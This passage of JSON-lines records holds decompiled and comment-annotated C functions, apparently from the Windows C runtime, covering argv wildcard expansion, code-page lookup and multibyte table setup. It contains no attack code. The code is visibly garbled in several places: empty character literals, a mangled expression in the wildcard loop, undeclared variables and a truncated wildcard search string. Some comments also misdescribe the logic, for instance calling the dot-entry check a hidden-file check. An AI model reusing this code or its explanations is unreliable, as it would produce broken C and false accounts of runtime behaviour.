*(undefined8 **)(param_4 + 0x10) = puVar3 + 4;\n            }\n        } else {\n            uVar6 = (longlong)*(undefined8 **)(param_4 + 0x10) - *(longlong *)param_4 >> 3;\n            if (uVar6 < 0x8000000000000000) {\n                LPVOID pvVar2 = _recalloc_base(*(LPVOID *)param_4, uVar6 * 2, 8);\n                if (pvVar2 != (LPVOID)0x0) {\n                    *(LPVOID *)param_4 = pvVar2;\n                    *(LPVOID *)(param_4 + 8) = (LPVOID)((longlong)pvVar2 + uVar6 * 8);\n                    *(LPVOID *)(param_4 + 0x10) = (LPVOID)((longlong)pvVar2 + uVar6 * 0x10);\n                }\n            }\n            _free_base((LPVOID)0x0);\n        }\n    }\n\n    *puVar3 = _Dst;\n    *(longlong *)(param_4 + 8) += 8;\n    _free_base((LPVOID)0x0);\n    return iVar7;\n}\n"}
{"Function Name": "common_expand_argv_wildcards<wchar_t>", "Address": "140018d78", "Source Code": "\\*\nint __cdecl common_expand_argv_wildcards<wchar_t>(wchar_t **arguments,wchar_t ***wildcard_results)\n{\n    int return_value; // Variable to store return value from function calls\n    BOOL find_next_result; // Variable to store the result of FindNextFileW\n    errno_t error_code; // Variable to store error codes\n    ulong *dos_error_pointer; // Pointer to store the DOS error number\n    wchar_t *current_argument; // Pointer to the current argument being processed\n    wchar_t *wildcard_character; // Pointer to the wildcard character found in the argument\n    HANDLE file_search_handle; // Handle for the file search operation\n    ulonglong argument_count; // Variable to store the count of arguments\n    ushort wildcard_character_value; // Variable to store the character value of the wildcard\n    longlong *argument_list_pointer; // Pointer to the list of arguments\n    ulonglong unused_variable = 0; // Unused variable\n    wchar_t **unused_pointer; // Unused variable\n    undefined1 security_stack_space[32]; // Stack space for security checks\n    ulonglong original_stack_value; // Variable to store the original stack value for security checks\n    original_stack_value = DAT_140038080 ^ (ulonglong)security_stack_space; // Initialize stack value for security check\n\n    // Check if param_2 is NULL\n    if (wildcard_results == (wchar_t ***)0x0) {\n        dos_error_pointer = __doserrno(); // Get the address of the DOS error number\n        *dos_error_pointer = 0x16; // Set the error number to indicate an invalid argument\n        FUN_14000ecf8(); // Call error handling function\n    } else {\n        *wildcard_results = (wchar_t **)0x0; // Initialize param_2 to NULL\n        current_argument = *arguments; // Get the first argument\n        argument_list_pointer = (longlong *)0x0; // Initialize the argument list pointer\n\n        // Loop through each argument until a NULL pointer is encountered\n        while (current_argument != (wchar_t *)0x0) {\n            wildcard_character = wcspbrk(current_argument, L\"?\"); // Search for wildcard characters in the argument\n            // If no wildcard is found\n            if (wildcard_character == (wchar_t *)0x0) {\n                return_value = copy_and_add_argument_to_buffer<wchar_t>(current_argument, (wchar_t *)0x0, 0, (argument_list<wchar_t> *)&argument_list_pointer); // Copy argument to buffer\n                if (return_value != 0) goto LAB_140018b6d; // Check for errors\n            } else {\n                // Loop to find the last valid character before the wildcard\n                while ((wildcard_character != current_argument && (0x2d < (ushort)(*wildcard_character + L'') || (0x200000000801U >> ((ulonglong)(ushort)(*pwwildcard_character L'') & 0x3f) & 1) == 0))) {\n                    wildcard_character--; // Move pointer back\n                }\n                // If the character before the wildcard is a colon and not the first character\n                if ((*wildcard_character == L':') && (wildcard_character != current_argument + 1)) {\n                    return_value = copy_and_add_argument_to_buffer<wchar_t>(current_argument, (wchar_t *)0x0, 0, (argument_list<wchar_t> *)&argument_list_pointer); // Copy argument to buffer\n                    if (return_value != 0) goto LAB_140018b6d; // Check for errors\n                }\n                wildcard_character_value = *wildcard_character + L''; // Get the character value of the wildcard\n                // If the character is invalid or the file search fails\n                if ((0x2d < wildcard_character_value) || (FindFirstFileExW(current_argument, FindExInfoStandard, &_Stack_298, FindExSearchNameMatch, (LPVOID)0x0, 0) == (HANDLE)0xffffffffffffffff)) {\n                    return_value = copy_and_add_argument_to_buffer<wchar_t>(current_argument, (wchar_t *)0x0, 0, (argument_list<wchar_t> *)&argument_list_pointer); // Copy argument to buffer\n                    if (return_value != 0) goto LAB_140018b6d; // Check for errors\n                }\n                file_search_handle = FindFirstFileExW(current_argument, FindExInfoStandard, &_Stack_298, FindExSearchNameMatch, (LPVOID)0x0, 0); // Start file search\n                // If the file search is successful\n                if (file_search_handle != (HANDLE)0xffffffffffffffff) {\n                    do {\n                        // Check if the file name is not a hidden file (starts with '.')\n                        if (((_Stack_298.cFileName[0] != L'.') || (_Stack_298.cFileName[1] != L'\\0' && (_Stack_298.cFileName[1] != L'.' || (_Stack_298.cFileName[2] != L'\\0'))))) &&\n                            (return_value = copy_and_add_argument_to_buffer<wchar_t>(_Stack_298.cFileName, current_argument, 0, (argument_list<wchar_t> *)&argument_list_pointer), return_value != 0)) {\n                            FindClose(file_search_handle); // Close the file handle\n                            goto LAB_140018b6d; // Check for errors\n                        }\n                        find_next_result = FindNextFileW(file_search_handle, &_Stack_298); // Get the next file in the search\n                    } while (find_next_result != 0); // Continue until no more files are found\n                    FindClose(file_search_handle); // Close the file handle\n                }\n            }\n            arguments++; // Move to the next argument\n            current_argument = *arguments; // Get the next argument\n        }\n    }\n    argument_count = (ulonglong)((longlong)argument_list_pointer + 7) >> 3; // Calculate the number of arguments\n    if (argument_count != 0) {\n        do {\n            _free_base((LPVOID)*argument_list_pointer); // Free each argument in the list\n            argument_list_pointer++; // Move to the next argument\n        } while (--argument_count != 0); // Continue until all arguments are freed\n    }\n    _free_base(argument_list_pointer); // Free the argument list pointer\nLAB_140018b6d:\n    __security_check_cookie(original_stack_value ^ (ulonglong)security_stack_space); // Perform security check\n    return 0; // Return success\n}\n*\\ \n \n\nint __cdecl common_expand_argv_wildcards<wchar_t>(wchar_t **arguments,wchar_t ***wildcard_results)\n{\n    int return_value;\n    BOOL find_next_result;\n    errno_t error_code;\n    ulong *dos_error_pointer;\n    wchar_t *current_argument;\n    wchar_t *wildcard_character;\n    HANDLE file_search_handle;\n    ulonglong argument_count;\n    ushort wildcard_character_value;\n    longlong *argument_list_pointer;\n    ulonglong unused_variable = 0;\n    wchar_t **unused_pointer;\n    undefined1 security_stack_space[32];\n    ulonglong original_stack_value;\n    original_stack_value = DAT_140038080 ^ (ulonglong)security_stack_space;\n    if (wildcard_results == (wchar_t ***)0x0) {\n        dos_error_pointer = __doserrno();\n        *dos_error_pointer = 0x16;\n        FUN_14000ecf8();\n    } else {\n        *wildcard_results = (wchar_t **)0x0;\n        current_argument = *arguments;\n        argument_list_pointer = (longlong *)0x0;\n        while (current_argument != (wchar_t *)0x0) {\n            wildcard_character = wcspbrk(current_argument, L\"?\");\n            if (wildcard_character == (wchar_t *)0x0) {\n                return_value = copy_and_add_argument_to_buffer<wchar_t>(current_argument, (wchar_t *)0x0, 0, (argument_list<wchar_t> *)&argument_list_pointer);\n                if (return_value != 0) goto LAB_140018b6d;\n            } else {\n                while ((wildcard_character != current_argument && (0x2d < (ushort)(*wildcard_character + L'') || (0x200000000801U >> ((ulonglong)(ushort)(*pwwildcard_character L'') & 0x3f) & 1) == 0))) {\n                    wildcard_character--;\n                }\n                if ((*wildcard_character == L':') && (wildcard_character != current_argument + 1)) {\n                    return_value = copy_and_add_argument_to_buffer<wchar_t>(current_argument, (wchar_t *)0x0, 0, (argument_list<wchar_t> *)&argument_list_pointer);\n                    if (return_value != 0) goto LAB_140018b6d;\n                }\n                wildcard_character_value = *wildcard_character + L'';\n                if ((0x2d < wildcard_character_value) || (FindFirstFileExW(current_argument, FindExInfoStandard, &_Stack_298, FindExSearchNameMatch, (LPVOID)0x0, 0) == (HANDLE)0xffffffffffffffff)) {\n                    return_value = copy_and_add_argument_to_buffer<wchar_t>(current_argument, (wchar_t *)0x0, 0, (argument_list<wchar_t> *)&argument_list_pointer);\n                    if (return_value != 0) goto LAB_140018b6d;\n                }\n                file_search_handle = FindFirstFileExW(current_argument, FindExInfoStandard, &_Stack_298, FindExSearchNameMatch, (LPVOID)0x0, 0);\n                if (file_search_handle != (HANDLE)0xffffffffffffffff) {\n                    do {\n                        if (((_Stack_298.cFileName[0] != L'.') || (_Stack_298.cFileName[1] != L'\\0' && (_Stack_298.cFileName[1] != L'.' || (_Stack_298.cFileName[2] != L'\\0'))))) &&\n                            (return_value = copy_and_add_argument_to_buffer<wchar_t>(_Stack_298.cFileName, current_argument, 0, (argument_list<wchar_t> *)&argument_list_pointer), return_value != 0)) {\n                            FindClose(file_search_handle);\n                            goto LAB_140018b6d;\n                        }\n                        find_next_result = FindNextFileW(file_search_handle, &_Stack_298);\n                    } while (find_next_result != 0);\n                    FindClose(file_search_handle);\n                }\n            }\n            arguments++;\n            current_argument = *arguments;\n        }\n    }\n    argument_count = (ulonglong)((longlong)argument_list_pointer + 7) >> 3;\n    if (argument_count != 0) {\n        do {\n            _free_base((LPVOID)*argument_list_pointer);\n            argument_list_pointer++;\n        } while (--argument_count != 0);\n    }\n    _free_base(argument_list_pointer);\nLAB_140018b6d:\n    __security_check_cookie(original_stack_value ^ (ulonglong)security_stack_space);\n    return 0;\n}\n"}
{"Function Name": "FUN_140018d80", "Address": "140018d80", "Source Code": "\nvoid FUN_140018d80(undefined8 inputParam, int *lockParam, undefined8 *dataParam, int *unlockParam)\n{\n    int currentValue; // Variable to hold an integer value\n    undefined8 *dataPointer; // Pointer to an undefined8 type\n    ulong *errorPointer; // Pointer to an unsigned long type\n    undefined1 (*dataArray)[16]; // Pointer to an array of 16 undefined1 types\n    longlong iterationCount; // Variable of long long type\n\n    __acrt_lock(*lockParam); // Lock the resource pointed by param_2\n    dataPointer = (undefined8 *)(*(longlong *)(*(longlong *)*dataParam + 0x88) + 0x18); // Retrieve a pointer from a nested structure\n    if (dataArray1 == (undefined1 (*)[16])0x0) { // Check if DAT_14003a990 is null\n        errorPointer = __doserrno(); // Get the DOS error number\n        *errorPointer = 0x16; // Set the error number to 0x16\n        FUN_14000ecf8(); // Call error handling function\n    } else {\n        if (dataPointer == (undefined8 *)0x0) { // Check if puVar4 is null\n            FUN_14000c740(dataArray1, 0, 0x101); // Call a function with parameters\n            errorPointer = __doserrno(); // Get the DOS error number\n            *errorPointer = 0x16; // Set the error number to 0x16\n            FUN_14000ecf8(); // Call error handling function\n        } else {\n            iterationCount = 2; // Initialize lVar8 to 2\n            dataArray = dataArray1; // Assign DAT_14003a990 to pauVar7\n            do {\n                // Copy 16 bytes of data from puVar4 to pauVar7\n                *(undefined8 *)*dataArray = *dataPointer;\n                *(undefined8 *)(*dataArray + 8) = dataPointer[1];\n                *(undefined8 *)dataArray[1] = dataPointer[2];\n                *(undefined8 *)(dataArray[1] + 8) = dataPointer[3];\n                *(undefined8 *)dataArray[2] = dataPointer[4];\n                *(undefined8 *)(dataArray[2] + 8) = dataPointer[5];\n                *(undefined8 *)dataArray[3] = dataPointer[6];\n                *(undefined8 *)(dataArray[3] + 8) = dataPointer[7];\n                *(undefined8 *)dataArray[4] = dataPointer[8];\n                *(undefined8 *)(dataArray[4] + 8) = dataPointer[9];\n                *(undefined8 *)dataArray[5] = dataPointer[10];\n                *(undefined8 *)(dataArray[5] + 8) = dataPointer[11];\n                *(undefined8 *)dataArray[6] = dataPointer[12];\n                *(undefined8 *)(dataArray[6] + 8) = dataPointer[13];\n                *(undefined8 *)dataArray[7] = dataPointer[14];\n                *(undefined8 *)(dataArray[7] + 8) = dataPointer[15];\n                dataPointer += 0x10; // Move to the next block of data\n                dataArray += 8; // Move to the next array element\n            } while (--iterationCount != 0); // Repeat for 2 iterations\n            (*dataArray)[0] = *(undefined1 *)dataPointer; // Assign the last byte from puVar4 to pauVar7\n        }\n    }\n\n    iterationCount = 2; // Initialize lVar8 to 2 again\n    dataPointer = (undefined8 *)(*(longlong *)(*(longlong *)*dataParam + 0x88) + 0x119); // Retrieve another pointer from a nested structure\n    if (dataArray2 != (undefined1 (*)[16])0x0) { // Check if DAT_14003a998 is not null\n        dataArray = dataArray2; // Assign DAT_14003a998 to pauVar7\n        if (dataPointer != (undefined8 *)0x0) { // Check if puVar4 is not null\n            do {\n                // Copy 16 bytes of data from puVar4 to pauVar7\n                *(undefined8 *)*dataArray = *dataPointer;\n                *(undefined8 *)(*dataArray + 8) = dataPointer[1];\n                *(undefined8 *)dataArray[1] = dataPointer[2];\n                *(undefined8 *)(dataArray[1] + 8) = dataPointer[3];\n                *(undefined8 *)dataArray[2] = dataPointer[4];\n                *(undefined8 *)(dataArray[2] + 8) = dataPointer[5];\n                *(undefined8 *)dataArray[3] = dataPointer[6];\n                *(undefined8 *)(dataArray[3] + 8) = dataPointer[7];\n                *(undefined8 *)dataArray[4] = dataPointer[8];\n                *(undefined8 *)(dataArray[4] + 8) = dataPointer[9];\n                *(undefined8 *)dataArray[5] = dataPointer[10];\n                *(undefined8 *)(dataArray[5] + 8) = dataPointer[11];\n                *(undefined8 *)dataArray[6] = dataPointer[12];\n                *(undefined8 *)(dataArray[6] + 8) = dataPointer[13];\n                *(undefined8 *)dataArray[7] = dataPointer[14];\n                *(undefined8 *)(dataArray[7] + 8) = dataPointer[15];\n                dataPointer += 0x10; // Move to the next block of data\n            } while (--iterationCount != 0); // Repeat for 2 iterations\n            goto LAB_140018ed0; // Jump to the end of the function\n        }\n        FUN_14000c740(dataArray2, 0, 0x100); // Call a function with parameters if puVar4 is null\n    }\n\n    errorPointer = __doserrno(); // Get the DOS error number\n    *errorPointer = 0x16; // Set the error number to 0x16\n    FUN_14000ecf8(); // Call error handling function\nLAB_140018ed0:\n    int *intPointer = (int *)**(undefined8 **)dataParam[1]; // Retrieve an integer pointer from param_3\n    LOCK(); // Lock the resource\n    currentValue = *intPointer; // Get the current value pointed by piVar2\n    *intPointer -= 1; // Decrement the value pointed by piVar2\n    UNLOCK(); // Unlock the resource\n    if ((currentValue == 1) && ((undefined *)**(undefined8 **)dataParam[1] != &DAT_1400387d0)) { // Check conditions\n        _free_base((LPVOID)**(undefined8 **)dataParam[1]); // Free the allocated memory\n    }\n    **(undefined8 **)dataParam[1] = *(undefined8 *)(*(longlong *)*dataParam + 0x88); // Update the value in param_3\n    LOCK(); // Lock the resource again\n    **(int **)(*(longlong *)*dataParam + 0x88) += 1; // Increment a value in the nested structure\n    UNLOCK(); // Unlock the resource\n    __acrt_unlock(*unlockParam); // Unlock the resource pointed by param_4\n    return; // Exit the function\n}\n"}
{"Function Name": "getSystemCP", "Address": "140018f3c", "Source Code": "\nint __cdecl getSystemCP(int codePageInput)\n{\n    longlong localeInfo; // Declare a variable to hold locale information\n    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&localeInfo, (__crt_locale_pointers *)0x0); // Initialize locale update\n    isCodePageSet = 0; // Reset global variable to 0\n\n    // Check if the input parameter is -2 (OEM code page)\n    if (codePageInput == -2) {\n        isCodePageSet = 1; // Set global variable to indicate OEM code page is being used\n        codePageInput = GetOEMCP(); // Retrieve the OEM code page\n    }\n    // Check if the input parameter is -3 (ANSI code page)\n    else if (codePageInput == -3) {\n        isCodePageSet = 1; // Set global variable to indicate ANSI code page is being used\n        codePageInput = GetACP(); // Retrieve the ANSI code page\n    }\n    // Check if the input parameter is -4 (locale-specific code page)\n    else if (codePageInput == -4) {\n        isCodePageSet = 1; // Set global variable to indicate locale-specific code page is being used\n        codePageInput = *(UINT *)(localeInfo + 0xc); // Retrieve the code page from the locale information\n    }\n\n    return codePageInput; // Return the determined code page\n}\n"}
{"Function Name": "setSBCS", "Address": "140018fbc", "Source Code": "\nvoid __cdecl setSBCS(__crt_multibyte_data *multibyteData)\n{\n    // Define a pointer to a location in the multibyte data structure\n    __crt_multibyte_data *dataPointer = multibyteData + 0x18;\n    \n    // Initialize a variable for loop control\n    longlong loopCounter = 0x101;\n    \n    // Call a function with specific parameters, likely to initialize or set values\n    FUN_14000c740((undefined1 (*) [16])dataPointer, 0, 0x101);\n    \n    // Set specific offsets in the multibyte data structure to zero\n    *(undefined8 *)(multibyteData + 4) = 0;\n    *(undefined8 *)(multibyteData + 0x220) = 0;\n    \n    // Loop to set a range of values in the multibyte data structure to zero\n    for (longlong innerLoopCounter = 6; innerLoopCounter != 0; innerLoopCounter--) {\n        *(undefined2 *)(multibyteData + 0xc + (6 - innerLoopCounter) * 2) = 0; // Set each value to zero\n    }\n    \n    // Copy data from a specific location to the previously defined pointer\n    do {\n        *dataPointer = dataPointer[(longlong)&DAT_1400387d0 - (longlong)multibyteData]; // Copy data\n        dataPointer++; // Move to the next position\n    } while (--loopCounter != 0); // Continue until the loop counter reaches zero\n    \n    // Reset the pointer to another location in the multibyte data structure\n    dataPointer = multibyteData + 0x119;\n    loopCounter = 0x100; // Initialize loop counter for the next section\n    \n    // Copy data from another specific location to the new pointer\n    do {\n        *dataPointer = dataPointer[(longlong)&DAT_1400387d0 - (longlong)multibyteData]; // Copy data\n        dataPointer++; // Move to the next position\n    } while (--loopCounter != 0); // Continue until the loop counter reaches zero\n}\n"}
{"Function Name": "setSBUpLow", "Address": "14001904c", "Source Code": "\nvoid __cdecl setSBUpLow(__crt_multibyte_data *param_1)\n{\n    uint currentIndex; // Variable to hold the current index\n    longlong loopCounter1; // Variable for loop counter\n    CHAR *charArrayPointer; // Pointer to character array\n    ulonglong leadByteProcessing; // Variable for lead byte processing\n    BYTE *leadByteArrayPointer; // Pointer to lead byte array\n    WORD *wordArrayPointer; // Pointer to word array for string type information\n    longlong loopCounter2; // Variable for loop counter\n    __crt_multibyte_data multibyteData; // Variable to hold multibyte data\n    BOOL getCPInfoResult; // Variable to hold the result of GetCPInfo\n    _cpinfo codePageInfo; // Local variable to hold code page information\n    CHAR localCharArray[255]; // Local character array\n    WORD localWordArray[512]; // Local word array for string type information\n    ulonglong securityCookie = DAT_140038080 ^ (ulonglong)(&localCharArray); // Security cookie for stack protection\n\n    // Check if the code page is invalid or if GetCPInfo fails\n    if ((*(UINT *)(param_1 + 4) == 0xfde9) || (getCPInfoResult = GetCPInfo(*(UINT *)(param_1 + 4), &codePageInfo), getCPInfoResult == 0)) {\n        currentIndex = 0; // Initialize index\n        loopCounter2 = 1; // Initialize loop counter\n        do {\n            // Check if the current index corresponds to an uppercase letter\n            if (currentIndex - 0x41 < 0x1a) {\n                param_1[loopCounter2 + 0x18] = (__crt_multibyte_data)((byte)param_1[loopCounter2 + 0x18] | 0x10); // Set flag for uppercase\n                multibyteData = (__crt_multibyte_data)((char)currentIndex + ' '); // Convert to lowercase\n            } \n            // Check if the current index corresponds to a lowercase letter\n            else if (currentIndex - 0x61 < 0x1a) {\n                param_1[loopCounter2 + 0x18] = (__crt_multibyte_data)((byte)param_1[loopCounter2 + 0x18] | 0x20); // Set flag for lowercase\n                multibyteData = (__crt_multibyte_data)((char)currentIndex - 0x20); // Convert to uppercase\n            } else {\n                multibyteData = (__crt_multibyte_data)0x0; // Set to zero if not a letter\n            }\n            param_1[loopCounter2 + 0x118] = multibyteData; // Store the converted character\n            currentIndex++; // Increment index\n            loopCounter2++; // Increment loop counter\n        } while (currentIndex < 0x100); // Loop until all characters are processed\n    } else {\n        currentIndex = 0; // Initialize index\n        charArrayPointer = localCharArray; // Set pointer to local character array\n        loopCounter2 = 0x100; // Set loop counter\n        do {\n            *charArrayPointer = (CHAR)currentIndex; // Fill local array with characters\n            currentIndex++; // Increment index\n            charArrayPointer++; // Move to the next character\n        } while (currentIndex < 0x100); // Loop until all characters are filled\n        leadByteArrayPointer = codePageInfo.LeadByte; // Set pointer to lead byte array\n        localCharArray[0] = ' '; // Initialize first character to space\n        // Process lead bytes\n        while (codePageInfo.LeadByte[0] != 0) {\n            byte secondLeadByte = leadByteArrayPointer[1]; // Get the second byte of the lead byte pair\n            leadByteProcessing = (ulonglong)codePageInfo.LeadByte[0]; // Get the first byte of the lead byte pair\n            // Loop through the range defined by the lead byte\n            while ((currentIndex = (uint)leadByteProcessing, currentIndex <= secondLeadByte && (currentIndex < 0x100))) {\n                localCharArray[leadByteProcessing] = ' '; // Set corresponding characters to space\n                leadByteProcessing = (ulonglong)(currentIndex + 1); // Move to the next character\n            }\n            leadByteArrayPointer += 2; // Move to the next lead byte pair\n            codePageInfo.LeadByte[0] = *leadByteArrayPointer; // Update lead byte\n        }\n        // Get string type information\n        __acrt_GetStringTypeA((__crt_locale_pointers *)0x0, 1, localCharArray, 0x100, localWordArray, *(UINT *)(param_1 + 4), 0);\n        // Map string to locale-specific representation\n        __acrt_LCMapStringA((__crt_locale_pointers *)0x0, *(wchar_t **)(param_1 + 0x220), 0x100, localCharArray, 0x100, (char *)(stackArray1 + 1), 0x100, *(int *)(param_1 + 4), 0);\n        __acrt_LCMapStringA((__crt_locale_pointers *)0x0, *(wchar_t **)(param_1 + 0x220), 0x200, localCharArray, 0x100, (char *)(stackArray2 + 1), 0x100, *(int *)(param_1 + 4), 0);\n        loopCounter1 = 1; // Initialize loop counter for processing string type information\n        wordArrayPointer = localWordArray; // Set pointer to word array\n        do {\n            // Check if the character is not a single-byte character\n            if ((*wordArrayPointer & 1) == 0) {\n                // Check if the character is not a lead byte\n                if ((*wordArrayPointer & 2) == 0) {\n                    multibyteData = (__crt_multibyte_data)0x0; // Set to zero if neither\n                } else {\n                    param_1[loopCounter1 + 0x18] = (__crt_multibyte_data)((byte)param_1[loopCounter1 + 0x18] | 0x20); // Set flag for lead byte\n                    multibyteData = stackArray2[loopCounter1]; // Get corresponding value from stack\n                }\n            } else {\n                param_1[loopCounter1 + 0x18] = (__crt_multibyte_data)((byte)param_1[loopCounter1 + 0x18] | 0x10); // Set flag for single-byte character\n                multibyteData = stackArray1[loopCounter1]; // Get corresponding value from stack\n            }\n            param_1[loopCounter1 + 0x118] = multibyteData; // Store the processed character\n            wordArrayPointer++; // Move to the next word\n            loopCounter1++; // Increment loop counter\n            loopCounter2--; // Decrement remaining loop count\n        } while (loopCounter2 != 0); // Continue until all characters are processed\n    }\n    __security_check_cookie(securityCookie ^ (ulonglong)(&localCharArray)); // Check security cookie for stack protection\n    return; // Exit function\n}\n"}
{"Function Name": "FUN_140019230", "Address": "140019230", "Source Code": "\nint FUN_140019230(int input_code_page, char is_null, __acrt_ptd *thread_data, __crt_multibyte_data **multibyte_data_pointer)\n{\n    int temp_integer; // Variable to store a temporary integer value\n    int *integer_pointer; // Pointer to an integer\n    undefined8 undefined_data; // Variable to hold undefined 8-byte data\n    undefined8 *data_pointer; // Pointer to undefined 8-byte data\n    __crt_multibyte_data *new_multibyte_data; // Pointer to multibyte data structure\n    __crt_multibyte_data *current_multibyte_data; // Pointer for iteration in the loop\n    longlong loop_counter; // Long integer for loop control\n    __crt_multibyte_data *copy_pointer; // Pointer to multibyte data structure for copying\n\n    // Update the thread's multibyte data\n    update_thread_multibyte_data_internal(thread_data, multibyte_data_pointer);\n    \n    // Get the system code page based on the input parameter\n    int system_code_page = getSystemCP(input_code_page);\n    \n    // Check if the current code page matches the one stored in the thread data\n    if (system_code_page == *(int *)(*(longlong *)(thread_data + 0x88) + 4)) {\n        return 0; // Return 0 if they match\n    }\n    \n    // Allocate memory for multibyte data structure\n    new_multibyte_data = (__crt_multibyte_data *)_malloc_base(0x228);\n    if (new_multibyte_data != (__crt_multibyte_data *)0x0) { // Check if allocation was successful\n        loop_counter = 4; // Initialize loop counter\n        data_pointer = *(undefined8 **)(thread_data + 0x88); // Get pointer to existing multibyte data\n        current_multibyte_data = new_multibyte_data; // Set the new multibyte data pointer\n        do {\n            copy_pointer = current_multibyte_data; // Set pointer for current iteration\n            undefined_data = data_pointer[1]; // Get the second element from the existing data\n            *(undefined8 *)copy_pointer = *data_pointer; // Copy first element\n            *(undefined8 *)(copy_pointer + 8) = undefined_data; // Copy second element\n            undefined_data = data_pointer[3]; // Get the fourth element\n            *(undefined8 *)(copy_pointer + 0x10) = data_pointer[2]; // Copy third element\n            *(undefined8 *)(copy_pointer + 0x18) = undefined_data; // Copy fourth element\n            undefined_data = data_pointer[5]; // Get the sixth element\n            *(undefined8 *)(copy_pointer + 0x20) = data_pointer[4]; // Copy fifth element\n            *(undefined8 *)(copy_pointer + 0x28) = undefined_data; // Copy sixth element\n            undefined_data = data_pointer[7]; // Get the eighth element\n            *(undefined8 *)(copy_pointer + 0x30) = data_pointer[6]; // Copy seventh element\n            *(undefined8 *)(copy_pointer + 0x38) = undefined_data; // Copy eighth element\n            undefined_data = data_pointer[9]; // Get the tenth element\n            *(undefined8 *)(copy_pointer + 0x40) = data_pointer[8]; // Copy ninth element\n            *(undefined8 *)(copy_pointer + 0x48) = undefined_data; // Copy tenth element\n            undefined_data = data_pointer[0xb]; // Get the twelfth element\n            *(undefined8 *)(copy_pointer + 0x50) = data_pointer[10]; // Copy eleventh element\n            *(undefined8 *)(copy_pointer + 0x58) = undefined_data; // Copy twelfth element\n            undefined_data = data_pointer[0xd]; // Get the fourteenth element\n            *(undefined8 *)(copy_pointer + 0x60) = data_pointer[0xc]; // Copy thirteenth element\n            *(undefined8 *)(copy_pointer + 0x68) = undefined_data; // Copy fourteenth element\n            undefined_data = data_pointer[0xf]; // Get the sixteenth element\n            *(undefined8 *)(copy_pointer + 0x70) = data_pointer[0xe]; // Copy fifteenth element\n            *(undefined8 *)(copy_pointer + 0x78) = undefined_data; // Copy sixteenth element\n            loop_counter = loop_counter + -1; // Decrement loop counter\n            data_pointer = data_pointer + 0x10; // Move to the next set of data\n            current_multibyte_data = copy_pointer + 0x80; // Move to the next position in the new data\n        } while (loop_counter != 0); // Continue until all elements are copied\n        \n        // Copy remaining elements from the existing data\n        undefined_data = data_pointer[0x11]; // Get the eighteenth element\n        *(undefined8 *)(copy_pointer + 0x80) = data_pointer[0x10]; // Copy seventeenth element\n        *(undefined8 *)(copy_pointer + 0x88) = undefined_data; // Copy eighteenth element\n        undefined_data = data_pointer[0x13]; // Get the twentieth element\n        *(undefined8 *)(copy_pointer + 0x90) = data_pointer[0x12]; // Copy nineteenth element\n        *(undefined8 *)(copy_pointer + 0x98) = undefined_data; // Copy twentieth element\n        *(undefined8 *)(copy_pointer + 0xa0) = data_pointer[0x14]; // Copy twenty-first element\n        *(undefined4 *)new_multibyte_data = 0; // Initialize the first element of the new data to 0\n        \n        // Set the multibyte code page without locking\n        system_code_page = _setmbcp_nolock(system_code_page, new_multibyte_data);\n        if (system_code_page != -1) { // Check if setting the code page was successful\n            if (is_null == '\\0') { // If the second parameter is null\n                FUN_140013840(); // Call another function\n            }\n            integer_pointer = *(int **)(thread_data + 0x88); // Get pointer to the reference count\n            LOCK(); // Lock for thread safety\n            temp_integer = *integer_pointer; // Get the current reference count\n            *integer_pointer = *integer_pointer + -1; // Decrement the reference count\n            UNLOCK(); // Unlock after modifying the reference count\n            if ((temp_integer == 1) && (*(undefined **)(thread_data + 0x88) != &DAT_1400387d0)) { // Check if it was the last reference\n                _free_base(*(undefined **)(thread_data + 0x88)); // Free the old multibyte data\n            }\n            *(undefined4 *)new_multibyte_data = 1; // Set the new data's reference count to 1\n            *(__crt_multibyte_data **)(thread_data + 0x88) = new_multibyte_data; // Update the thread's multibyte data pointer\n            if ((((byte)thread_data[0x3a8] & 2) == 0) && (((byte)DAT_1400381a4 & 1) == 0)) { // Check certain flags\n                int local_array[2] = {5, 5}; // Local array for function call\n                FUN_140018d80(local_array, local_array + 1, &thread_data, local_array); // Call another function\n                if (is_null != '\\0') { // If the second parameter is not null\n                    PTR_DAT_140038310 = *multibyte_data_pointer; // Update a global pointer\n                }\n            }\n            goto LAB_140019328; // Jump to cleanup code\n        }\n        dos_error_pointer = __doserrno(); // Get the pointer to the DOS error number\n        *dos_error_pointer = 0x16; // Set the error number to 0x16 (specific error)\n    }\n    system_code_page = -1; // Set return value to -1 on failure\nLAB_140019328:\n    _free_base(new_multibyte_data); // Free the allocated multibyte data\n    return system_code_page; // Return the result\n}\n"}
{"Function Name": "update_thread_multibyte_data_internal", "Address": "1400193f4", "Source Code": "\\*\n__crt_multibyte_data * __cdecl\nupdate_thread_multibyte_data_internal(__acrt_ptd *param_1, __crt_multibyte_data **param_2)\n{\n    int iVar1; // Variable to hold the reference count\n    __crt_multibyte_data *p_Var2; // Pointer to multibyte data\n\n    // Check if the thread-specific data is not initialized or if the multibyte data pointer is null\n    if (((*(uint *)(param_1 + 0x3a8) & DAT_1400381a4) == 0) || (*(longlong *)(param_1 + 0x90) == 0)) {\n        __acrt_lock(5); // Acquire lock for thread safety\n        p_Var2 = *(__crt_multibyte_data **)(param_1 + 0x88); // Get current multibyte data pointer\n        \n        // Check if the current multibyte data is different from the one being passed in\n        if (p_Var2 != *param_2) {\n            // If current multibyte data is not null\n            if (p_Var2 != (__crt_multibyte_data *)0x0) {\n                LOCK(); // Lock for thread safety\n                iVar1 = *(int *)p_Var2; // Get the reference count\n                *(int *)p_Var2 = iVar1 - 1; // Decrement the reference count\n                UNLOCK(); // Unlock after modifying reference count\n                \n                // If the reference count reaches 1 and it's not a special case, free the memory\n                if ((iVar1 == 1) && (p_Var2 != (__crt_multibyte_data *)&DAT_1400387d0)) {\n                    _free_base(p_Var2); // Free the multibyte data\n                }\n            }\n            p_Var2 = *param_2; // Update to the new multibyte data\n            *(__crt_multibyte_data **)(param_1 + 0x88) = p_Var2; // Set the new multibyte data pointer\n            LOCK(); // Lock for thread safety\n            *(int *)p_Var2 = *(int *)p_Var2 + 1; // Increment the reference count for the new data\n            UNLOCK(); // Unlock after modifying reference count\n        }\n        __acrt_unlock(5); // Release the lock\n    } else {\n        p_Var2 = *(__crt_multibyte_data **)(param_1 + 0x88); // If already initialized, just get the current pointer\n    }\n\n    // If the pointer is not null, return it\n    if (p_Var2 != (__crt_multibyte_data *)0x0) {\n        return p_Var2; // Return the multibyte data pointer\n    }\n    abort(); // If null, abort the program\n}\n*\\ \n \n\n__crt_multibyte_data * __cdecl\nupdate_thread_multibyte_data_internal(__acrt_ptd *param_1, __crt_multibyte_data **param_2)\n{\n    int iVar1;\n    __crt_multibyte_data *p_Var2;\n\n    if (((*(uint *)(param_1 